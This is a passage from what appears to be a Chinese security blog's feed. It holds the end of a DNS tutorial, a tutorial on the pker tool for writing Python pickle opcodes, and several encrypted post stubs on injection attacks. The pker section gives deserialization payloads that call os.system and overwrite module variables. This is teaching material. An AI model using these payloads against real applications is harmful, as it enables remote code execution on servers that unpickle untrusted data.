本身不具备真正的解析域名的功能。它的作用有两个：</p><ol><li>代替用户的设备参与域名解析</li><li>缓存域名的查询记录，当其他设备发起相同的域名查询请求时可以直接返回查询结果，可以加快域名查询速度。</li></ol><p>用户设备 -&gt;检查hosts文件-&gt; LocalDNS 一般是递归查询，而 LocalDNS 发现它自己没有缓存对应的数据后，则需要向 DNS 根服务器发起查询请求，这个请求，一般是迭代查询。所以任何 LocalDNS 都需知道 DNS 根服务器的 ip 地址。</p><h2 id="DNS-根服务器"><a href="#DNS-根服务器" class="headerlink" title="DNS 根服务器"></a>DNS 根服务器</h2><p>DNS 根服务器（root name server），全球只有 <code>13</code> 个，编号从 <code>a.root-servers.net</code> 一直到 <code>m.root-servers.net</code>。之所以不说 13 台，是因为每个 DNS 根节点都会有多个服务器负责均衡查询（即任播节点），你可以在这个网站查询：<a href="https://root-servers.org/">https://root-servers.org/</a> 。</p><p>现在解析 DNS 的时候，已经不再需要知道 DNS 根服务器的真正的 ip 地址，只需要知道任播节点的ip地址就可以在世界各地与当地的最优节点进行通信了，所以现在大多数的 DNS 根服务器的 ip 地址都是任播节点 的 ip 地址。这样速度最快</p><p>所以，DNS 根服务器掌管着所有 <code>DNS 顶级域名服务器</code> 的地址，比如大家熟悉的 <code>.com</code>、<code>.org</code>、<code>.edu</code> 等等。假如我们查询的顶级域名是 <code>.com</code>，DNS 根服务器会将<code>.com</code> 顶级域名服务器的地址发回给 LocalDNS 服务器，让它自己去那里查。于是 LocalDNS 服务器再向手握 <code>.com</code> 的 DNS 顶级域名服务器发起查询</p><h2 id="DNS-顶级域名服务器"><a href="#DNS-顶级域名服务器" class="headerlink" title="DNS 顶级域名服务器"></a>DNS 顶级域名服务器</h2><p>手握 <code>.com</code> 的 DNS 顶级域名服务器一看来源的查询是 <code>xxx.com</code>，按理来说应该可以找到对应的 ip 并直接返回了。但是现在基本上都是授权给其他厂家去做的，被授权的叫<code>DNS 权威域名服务器</code>，或者企业自建的 DNS 服务器。举个例子，解析一下<code>baidu.com</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">~$ dig baidu.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.24.04.1-Ubuntu &lt;&lt;&gt;&gt; baidu.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 46978</span><br><span class="hljs-string">;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; MBZ: 0x0001, udp: 1232</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;baidu.com.                     IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">baidu.com.              1       IN      A       198.18.0.6</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 0 msec</span><br><span class="hljs-string">;; SERVER: 10.255.255.254#53(10.255.255.254) (UDP)</span><br><span class="hljs-string">;; WHEN: Mon Jan 27 18:59:34 CST 2025</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 54</span><br></code></pre></td></tr></table></figure><p>这里表示查询首先经过了<code>10.255.255.254</code>（本地的localDNS）设置的DNS解析地址,如果本地没有对应的缓存记录,他就会发起递归查询，首先向<strong>最近的传播节点</strong>查询<code>baidu.com</code>的顶级域名服务器（<code>.com</code> 的权威服务器）。节点会返回 <code>.com</code> 的权威服务器地址。LocalDNS 再向 <code>.com</code> 的权威服务器查询 <code>baidu.com</code> 的权威服务器。<code>.com</code> 的权威服务器返回 <code>baidu.com</code> 的权威域名服务器地址,LocalDNS 最终向 <code>dns.baidu.com</code> 查询，获取到实际的ip地址，</p><p>这个时候 LocalDNS 服务器就会缓存 <code>baidu.com</code> 的 DNS 权威域名服务器，免得下次查的时候还得再走一遍之前的流程（当然是在缓存未过期的情况下）。</p><h2 id="DNS-权威域名服务器"><a href="#DNS-权威域名服务器" class="headerlink" title="DNS 权威域名服务器"></a>DNS 权威域名服务器</h2><p>DNS 权威域名服务器要提前申请 DNS 解析授权，这类 DNS 域名服务器一般掌管着特定域下所有的子域和主机，比如它不仅知道 <code>baidu.com</code> 的 ip，同样也知道 <code>www.baidu.com</code> 的 ip。所以它可以直接返回结果，这一步没啥好说的。</p><p>同样， LocalDNS 服务器也会缓存 <code>baidu.com</code> 的 ip，免得下次查的时候还得再走一遍之前的流程（当然也是在缓存未过期的情况下）。</p><p>各大公司一般都有自己的权威域名服务器，自己维护 DNS，好处有很多，比如：</p><ol><li>方便管理。假如不自己维护域名信息，域名生效时间和缓存时间都是不可控的，而自己搭建可以避免这些问题。</li><li>动态管理。比如通过一些软件来更新自己的 DNS 信息更方便，还可以做动态域名解析。</li></ol><h3 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h3><p>（以下流程以 A 记录(表示该域名解析到的 IP 地址)为例）</p><ol><li>设备 -&gt; LocalDNS 服务器（递归查询）</li><li>LocalDNS 服务器 -&gt; DNS 根服务器或者最近的传播节点（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 根服务器或者最近的传播节点（返回顶级域名服务器的地址）</li><li>LocalDNS 服务器 -&gt; DNS 顶级域名服务器（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 顶级域名服务器（返回权威域名服务器的地址）</li><li>LocalDNS 服务器 -&gt; DNS 权威域名服务器（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 权威域名服务器（返回 ip）</li><li>设备 &lt;- LocalDNS 服务器（返回 ip）</li></ol><h2 id="DNS-的几个重要概念"><a href="#DNS-的几个重要概念" class="headerlink" title="DNS 的几个重要概念"></a>DNS 的几个重要概念</h2><h3 id="DNS-资源记录（Resource-Record-RR）"><a href="#DNS-资源记录（Resource-Record-RR）" class="headerlink" title="DNS 资源记录（Resource Record, RR）"></a>DNS 资源记录（Resource Record, RR）</h3><p>DNS 服务器有自己的域文件（zone file），zone file 是由多个记录组成的，每一个记录就被称为资源记录。</p><p>假如你买了一个域名，需要绑定到对应的 ip 上来提供 web 服务，或者要提供其他服务，这个时候域名的销售方会让你选择解析的类型，常见的有以下几种：</p><ol><li><code>A</code> 记录：将域名指向一个 IPv4 地址（例如：100.100.100.100）最常用的</li><li><code>CNAME</code> 记录：将域名指向一个域名，实现与被指向域名相同的访问效果，可以简单地理解为域名的别名。比如 <code>www.baidu.com</code> 就是 cname 到 <code>baidu.com</code> 上，然后 <code>baidu.com</code> 是有自己的 A 记录的，这样有个好处就是假如有很多个域名，<code>a.baidu.com</code>、<code>b.baidu.com</code>…，但是 ip 只有 1 个，如果不用 cname，当这个 ip 变更的时候，每个与此 ip 绑定的域名都要去改 A 记录；用了 cname 之后，只需要改 cname 的域名（<code>baidu.com</code>）的 A 记录即可。（CDN 加速应该就是这样做的对吧~）</li><li><code>MX</code> 记录：指向电子邮件服务器地址，一般会根据邮箱服务商提供的 MX 记录填写此记录。</li><li><code>NS</code> 记录：权威域名服务器记录，即将某些域名指定让某个 DNS 域名服务器来解析。需要注意的是，只有顶级域名（或者说一级域名）才有 ns 记录，比如 <code>www.weibo.com</code> 是没有 ns 记录的。</li><li><code>TXT</code> 记录：可任意填写、可为空。一般做一些验证记录时会使用此项，例如：SPF 记录（用于反垃圾邮件）</li><li><code>AAAA</code> 记录：将域名指向一个 IPv6 地址（例如：ff03:0:0:0:0:0:0:c1）</li><li><code>SOA</code> 记录：SOA（Start of Authority）叫做起始授权机构记录。通俗地来讲，一个域名可能有很多个 NS 记录，因为会有多台服务器在进行解析（负责均衡或者备份），但哪一个才是主 DNS 权威服务器呢？这个就要看 SOA 记录了，它说明了在众多 NS 记录里哪一台才是主 DNS 权威服务器。这个主 DNS 权威服务器会负责其他事情，比如告诉其他 NS 权威服务器什么时候该更新数据（通过域传送的方式，下面会讲），甚至记录里还有对应联系人的邮件、TTL 等信息，这里就不多赘述了。</li><li><code>PTR</code> 记录：PTR 记录是 A 记录的逆向记录，负责将 IP 反向解析为域名，这个内容稍多，单独放在下面讲</li><li><code>AXFR</code>、<code>IXFR</code> 记录：涉及区域传送，单独放在下面讲</li></ol><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250127192139251.png" alt="image-20250127192139251"></p><h3 id="FQDN"><a href="#FQDN" class="headerlink" title="FQDN"></a>FQDN</h3><p><strong>FQDN</strong>（Fully Qualified Domain Name，完全限定域名）是指在域名系统（DNS）中一个完整的、唯一的域名，用来精确标识互联网上的一个主机或服务的位置。</p><h4 id="FQDN-的特点："><a href="#FQDN-的特点：" class="headerlink" title="FQDN 的特点："></a><strong>FQDN 的特点：</strong></h4><ol><li><strong>完整性：</strong><ul><li>FQDN 包括主机名（如 <code>www</code>）和域名（如 <code>example.com</code>）。</li><li>必须包含顶级域名（如 <code>.com</code>、<code>.org</code> 等），并最终以一个点（<code>.</code>）结尾（在技术上，最后的点表示 DNS 根）。</li></ul></li><li><strong>唯一性：</strong><ul><li>FQDN 是全球唯一的，它能在整个互联网中唯一标识一台设备或服务。</li><li>每个 FQDN 都指向一个特定的 IP 地址（通过 DNS 解析）。</li></ul></li><li><strong>结构</strong><ul><li>&lt;主机名&gt;.&lt;子域名&gt;.&lt;二级域名&gt;.&lt;顶级域名&gt;.</li></ul></li><li><strong>用途</strong><ul><li>HTTPS 证书（SSL&#x2F;TLS）通常绑定到 FQDN，确保通信的安全性和唯一性。</li><li>在配置邮件服务器、SSH 服务等网络服务时，通常需要填写 FQDN 以确保服务可以被正确识别</li></ul></li></ol><h3 id="DDNS"><a href="#DDNS" class="headerlink" title="DDNS"></a>DDNS</h3><p><code>DDNS</code>比<code>DNS</code>多了一个D多的就是一个<code>dynamic(动态的)</code></p><p><code>DDNS</code>是一种域名解析服务，用来将动态变化的 IP 地址实时更新到域名解析记录中，从而让用户能够通过固定的域名访问 IP 地址不断变化的设备。</p><h2 id="Non-authoritative-answer"><a href="#Non-authoritative-answer" class="headerlink" title="Non-authoritative answer"></a>Non-authoritative answer</h2><p>这个意思就是这个解析记录是从 LocalDNS 的缓存里拿来的，而不是向真正负责这个域名的 DNS 权威服务器拿来的</p><h2 id="DNS-区域传送"><a href="#DNS-区域传送" class="headerlink" title="DNS 区域传送"></a>DNS 区域传送</h2><p>是一种用于在 DNS 服务器之间复制 DNS 区域数据的机制，其目的是确保多个 DNS 服务器中存储的域名解析记录保持一致。这种机制通常在主从 DNS 服务器之间使用,DNS区域传送有两种方式：</p><ol><li><code>axfr</code>：完整区域传送</li><li><code>ixfr</code>：增量区域传送</li></ol><p>所以，正常情况下 DNS 区域传送操作只有经过授权的 DNS 服务器才有权执行，但许多 DNS 服务器却被错误地配置成只要有人发出请求，就直接提供一个 zone 的 DNS 内容。DNS 域传送漏洞会在下一篇详细介绍，这个手段是前些年用于信息收集的手段之一。</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pker</title>
    <link href="/tuyi/2025/01/26/pker/"/>
    <url>/tuyi/2025/01/26/pker/</url>
    
    <content type="html"><![CDATA[<h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li><li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li><li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li></ul><h2 id="pker能做的事"><a href="#pker能做的事" class="headerlink" title="pker能做的事"></a>pker能做的事</h2><blockquote><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul></blockquote><p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p><h2 id="使用方法与示例"><a href="#使用方法与示例" class="headerlink" title="使用方法与示例"></a>使用方法与示例</h2><ol><li>pker中的针对pickle的特殊语法需要重点掌握</li><li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li><li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">以下<span class="hljs-keyword">module</span>都可以是包含`.`的子<span class="hljs-keyword">module</span><br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br><span class="hljs-keyword">GLOBAL</span><br>对应opcode：b<span class="hljs-string">&#x27;c&#x27;</span><br>获取<span class="hljs-keyword">module</span>下的一个全局对象（没有import的也可以，比如下面的os）：<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：<span class="hljs-keyword">module</span>,instance(callable、<span class="hljs-keyword">module</span>都是instance)  <br><br>INST<br>对应opcode：b<span class="hljs-string">&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>对应opcode：b<span class="hljs-string">&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：callable,para<br><br>xxx(xx,...)<br>对应opcode：b<span class="hljs-string">&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：b<span class="hljs-string">&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>对应opcode：b<span class="hljs-string">&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：b<span class="hljs-string">&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）<br></code></pre></td></tr></table></figure><p>注意：</p><ol><li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li><li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>被解析为：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul><li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>覆盖引入模块的变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来会给出一些具体的基本操作的实例。</p><h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul><li>通过<code>b&#39;R&#39;</code>调用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`调用<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;i&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>多参数调用函数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul><li>实例化对象是一种特殊的函数执行</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># 或者</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>其中，python原文件中包含：</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>也可以先实例化再赋值：</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul><li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li><li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li></ul><p>参考： <a href="https://xz.aliyun.com/news/6608">https://xz.aliyun.com/news/6608</a> </p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle注入指北</title>
    <link href="/tuyi/2025/01/26/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/tuyi/2025/01/26/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Oracle注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xpath指北</title>
    <link href="/tuyi/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/tuyi/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Xpath注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe指北</title>
    <link href="/tuyi/2025/01/26/xxe%E6%8C%87%E5%8C%97/"/>
    <url>/tuyi/2025/01/26/xxe%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b53c19b66ca7debee8ec846570c8462fc5f8413e74213acfa13f2ad86b878447">7389a4e37e9dabc8af72228f567f583bef62c9a4a6fdd6cca750ba72693957ded54d803a165f2834f6fb605cb5bf53cd55f2c9f326d2060d29085156d8630dbbbd17cc0b36776df8c21697c186dec117d86b615424e5d8d27b98505c3dc070d40c7c97ee1744f7ae77e897f68553e4b680e87e79dab8dd5317b009378a9d14c54f1d66ebd940ea89d8d7e1bd3e0e0fb8ca22942ea8f480b37ae62e807c01ad9a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss指北</title>
    <link href="/tuyi/2025/01/26/xss%E6%8C%87%E5%8C%97/"/>
    <url>/tuyi/2025/01/26/xss%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
